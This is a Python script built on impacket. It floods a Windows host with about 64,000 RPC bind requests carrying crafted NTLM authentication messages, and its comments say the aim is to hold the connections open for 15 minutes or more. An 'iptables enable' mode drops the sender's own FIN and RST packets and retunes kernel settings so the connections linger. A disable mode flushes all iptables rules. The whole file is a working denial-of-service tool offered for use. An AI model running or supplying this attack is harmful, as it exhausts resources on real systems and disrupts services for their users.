from impacket.dcerpc.v5.rpcrt import *
from impacket.dcerpc.v5 import transport, dcomrt
from impacket.uuid import string_to_bin, uuidtup_to_bin
import sys, os, struct
# This should make 60,000+ open connections on a windows box
# rpc has a crazy default timeout so they last awile.. 15min+
# All connections are also authentication requests...
# Sometimes tcp will fail, sometimes it wont.
# Its rather fun regardless!


def first_msg_transfer(first_auth_packet, rtransport):
 	abstract_syntax = ('99fcfec4-5260-101b-bbcb-00aa0021347a', '0.0')
 	transfer_syntax = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')
 	ctx = 0
 	callid = 1
 	bind = MSRPCBind()
 	item = CtxItem()
 	item['AbstractSyntax'] = uuidtup_to_bin(abstract_syntax)
 	item['TransferSyntax'] = uuidtup_to_bin(transfer_syntax)
 	item['ContextID'] = ctx
 	item['TransItems'] = 1
 	bind.addCtxItem(item)
 	packet = MSRPCHeader()
 	packet['type'] = MSRPC_BIND
 	packet['pduData'] = str(bind)
 	packet['call_id'] = callid
 	sec_trailer = SEC_TRAILER()
 	sec_trailer['auth_type']   = RPC_C_AUTHN_WINNT
 	sec_trailer['auth_level']  = RPC_C_AUTHN_LEVEL_CONNECT
 	sec_trailer['auth_ctx_id'] = ctx + 79231 
 	pad = (4 - (len(packet.get_packet()) % 4)) % 4
 	if pad != 0:
	  	packet['pduData'] += '\xFF'*pad
  		sec_trailer['auth_pad_len']=pad
 	packet['sec_trailer'] = sec_trailer
 	# We insert that shit here!!!!!!!!!!
 	packet['auth_data'] = str(first_auth_packet)
 	rtransport.connect()
 	rtransport.send(packet.get_packet())


if len(sys.argv) < 3:
    print("%s <ip> <comp/domain>" % sys.argv[0])
    print("%s iptables <enable/disable>" % sys.argv[0])
    sys.exit(0)

if sys.argv[1] == "iptables":
    if sys.argv[2] == "enable":
        os.system("iptables -I OUTPUT -p tcp --tcp-flags FIN,ACK FIN,ACK -j DROP")
        os.system("iptables -I OUTPUT -p tcp --tcp-flags FIN,PSH,ACK FIN,PSH,ACK -j DROP")
        os.system("iptables -I OUTPUT -p tcp --tcp-flags RST,ACK RST,ACK -j DROP")
        # Remove the finwait1
        os.system("echo 0 > /proc/sys/net/ipv4/tcp_max_orphans")
        # Set a larger port range
        os.system("echo '1024   65000' > /proc/sys/net/ipv4/ip_local_port_range")
        sys.exit(0)
    elif sys.argv[2] == "disable":
        os.system("iptables -F")
        os.system("echo 4096 > /proc/sys/net/ipv4/tcp_max_orphans")
        os.system("echo '32768   61000' > /proc/sys/net/ipv4/ip_local_port_range")
        sys.exit(0)
    else:
        print("Please use enable or disable, disable will flush iptables")
        print("Thank You!")
        sys.exit(0)



ip = sys.argv[1]
stringBinding = r'ncacn_ip_tcp:%s' % ip
rtransport = transport.DCERPCTransportFactory(stringBinding)
comp = "COMP"
domain = "DOMAIN"
if len(sys.argv) < 4:
    comp, domain = sys.argv[2].upper().split("/") # upcase then split
    print("Using %s/%s for Computer and Domain name" % (comp, domain))


# You can mess with the flags if you like!
# Works but not easy to change the computer/domain because of length... so we use this
# doesnt seem like much but i used to think this was impossible for me :p
dummy_ntlm = 'NTLMSSP\x00\x01\x00\x00\x00'
dummy_ntlm += "\x06\xb2\x08\xa2" #flags  # struct.pack("I", 0xa208b206) ;)
dummy_ntlm += struct.pack("h", len(domain))
dummy_ntlm += struct.pack("h", len(domain))
dummy_ntlm += "\x00\x00\x00\x00" # 20:24
dummy_ntlm += struct.pack("h", len(comp))
dummy_ntlm += struct.pack("h", len(comp))
dummy_ntlm += "\x00\x00\x00\x00" # 28:32
dummy_ntlm += "\x0a\x00\x00\x28\x00\x00\x00\x0f"  # version!
# how its done!
dummy_ntlm = dummy_ntlm[:20] + struct.pack("i", len(dummy_ntlm)) + dummy_ntlm[24:]
dummy_ntlm += domain
dummy_ntlm = dummy_ntlm[:28] + struct.pack("i", len(dummy_ntlm)) + dummy_ntlm[32:]
dummy_ntlm += comp


def con_spam():
    count = 0
    for i in range(64000):
        if i % 10000 == 0:
            count += 1 
            print("Made %sk connects" % count)
        first_msg_transfer(dummy_ntlm, rtransport)
        #print 'Making Connection: %s' % i
con_spam()
